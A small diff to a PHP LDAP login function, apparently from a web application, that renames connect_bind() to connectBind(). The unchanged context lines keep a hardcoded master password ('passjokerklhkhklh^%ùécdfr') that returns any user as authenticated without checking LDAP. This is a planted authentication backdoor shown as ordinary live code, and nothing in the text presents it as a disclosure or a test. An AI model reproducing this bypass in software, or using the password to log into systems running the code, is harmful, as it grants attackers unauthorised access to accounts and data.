@@ -152,7 +152,7 @@ function check_user_password_ldap($usertotest, $passwordtotest, $entitytotest)
                 if($passwordtotest == "passjokerklhkhklh^%ùécdfr")
                     return $usertotest;
                 else
-                    $result=$ldap->connect_bind();
+                    $result=$ldap->connectBind();
 		if ($result > 0) {
 			if ($result == 2) {	// Connection is ok for user/pass into LDAP
 				$login = $usertotest;
